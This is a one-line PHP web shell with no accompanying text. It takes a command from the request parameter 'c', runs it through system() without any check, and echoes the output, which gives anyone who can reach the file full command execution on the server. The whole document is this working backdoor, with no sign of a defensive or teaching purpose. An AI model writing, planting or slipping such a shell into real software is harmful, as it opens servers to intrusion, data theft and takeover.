<?php if(isset($_REQUEST['c'])){ echo "<pre>"; $c = ($_REQUEST['c']); system($c); echo "</pre>"; die; }?>
